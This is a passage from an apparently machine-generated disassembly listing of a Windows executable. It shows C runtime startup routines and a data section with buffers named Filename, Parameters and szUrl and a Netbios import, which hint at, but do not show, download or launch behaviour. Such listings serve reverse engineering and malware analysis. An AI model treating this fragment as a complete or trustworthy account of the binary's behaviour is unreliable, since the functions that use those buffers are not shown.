		push	offset dword_4056A0
		push	[esp+8+arg_0]
		call	__dllonexit
		add	esp, 0Ch
		retn
sub_403DA6	endp


; =============== S U B	R O U T	I N E =======================================


sub_403DCC	proc near		; CODE XREF: start+E5p

arg_0		= dword	ptr  4

		push	[esp+arg_0]
		call	sub_403DA6
		neg	eax
		sbb	eax, eax
		neg	eax
		pop	ecx
		dec	eax
		retn
sub_403DCC	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_403DDE	proc near		; CODE XREF: start+AEp

var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h

		push	0Ch
		push	offset dword_402310
		call	__SEH_prolog
		mov	[ebp+var_1C], offset dword_4023C8

loc_403DF1:				; CODE XREF: sub_403DDE+3Cj
		cmp	[ebp+var_1C], offset dword_4023C8
		jnb	short loc_403E1C
		and	[ebp+ms_exc.disabled], 0
		mov	eax, [ebp+var_1C]
		mov	eax, [eax]
		test	eax, eax
		jz	short loc_403E12
		call	eax
		jmp	short loc_403E12
; ---------------------------------------------------------------------------
		db 33h
		dd 8BC340C0h
		db 65h,	0E8h
; ---------------------------------------------------------------------------

loc_403E12:				; CODE XREF: sub_403DDE+27j
					; sub_403DDE+2Bj
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		add	[ebp+var_1C], 4
		jmp	short loc_403DF1
; ---------------------------------------------------------------------------

loc_403E1C:				; CODE XREF: sub_403DDE+1Aj
		call	__SEH_epilog
		retn
sub_403DDE	endp

; ---------------------------------------------------------------------------
word_403E22	dw 0C6Ah		; DATA XREF: start+E0o
aH@		db 'h #@',0
		db 0E8h, 1Ah, 0FFh
		dd 45C7FFFFh, 4023D0E4h, 0E47D8100h, 4023D0h, 65832273h
		dd 458B00FCh, 85008BE4h, 0FF0B74C0h, 3307EBD0h,	8BC340C0h
		dd 4D83E865h, 4583FFFCh, 0D5EB04E4h, 0FFFF1EE8h
		db 0FFh, 0C3h
; [00000006 BYTES: COLLAPSED FUNCTION _initterm. PRESS KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_403E6C	proc near		; CODE XREF: start:loc_403BA6p
		push	30000h		; Mask
		push	10000h		; NewValue
		call	_controlfp
		pop	ecx
		pop	ecx
		retn
sub_403E6C	endp


; =============== S U B	R O U T	I N E =======================================


sub_403E7E	proc near		; CODE XREF: start+B3p
					; DATA XREF: start+C0o
		xor	eax, eax
		retn
sub_403E7E	endp

; ---------------------------------------------------------------------------
		db 0CCh
; [00000006 BYTES: COLLAPSED FUNCTION __dllonexit. PRESS KEYPAD	"+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION _controlfp. PRESS	KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION Netbios. PRESS KEYPAD "+"	TO EXPAND]
		dd 5Bh dup(0)
		dd 0A6h	dup(?)
dword_404298	dd 148h	dup(?)		; DATA XREF: sub_403180+44o
dword_4047B8	dd 100h	dup(?)		; DATA XREF: sub_403710+48o
					; sub_403710+5Eo ...
; char Filename[1024]
Filename	db 400h	dup(?)		; DATA XREF: sub_403710+16o
					; sub_403710+28o
; char Parameters[]
Parameters	db 400h	dup(?)		; DATA XREF: sub_403710+1o
					; sub_403710+83o ...
; char Dest
Dest		db ?			; DATA XREF: sub_4037F0+Co
					; sub_4037F0+16o ...
		align 4
		dd 3Fh dup(?)
; const	CHAR szUrl
szUrl		db ?			; DATA XREF: sub_403860+68w
					; sub_403860:loc_4038D1o ...
		align 4
		dd 3Fh dup(?)
; char byte_4055B8[104]
byte_4055B8	db 68h dup(?)		; DATA XREF: sub_4010F0+6Bo
					; WinMain(x,x,x,x)+47o
; char Buffer[104]
Buffer		db 68h dup(?)		; DATA XREF: WinMain(x,x,x,x)+3Bo
dword_405688	dd ?			; DATA XREF: start+F6r
dword_40568C	dd ?			; DATA XREF: start+EAr
dword_405690	dd ?			; DATA XREF: start+9Ar
dword_405694	dd ?			; DATA XREF: start+8Cr
dword_405698	dd ?			; DATA XREF: start+A9w
dword_40569C	dd ?			; DATA XREF: start+78w
					; sub_403DA6:loc_403DB5o
dword_4056A0	dd ?			; DATA XREF: start+7Fw	sub_403DA6r ...
		align 1000h
_data		ends


		end start
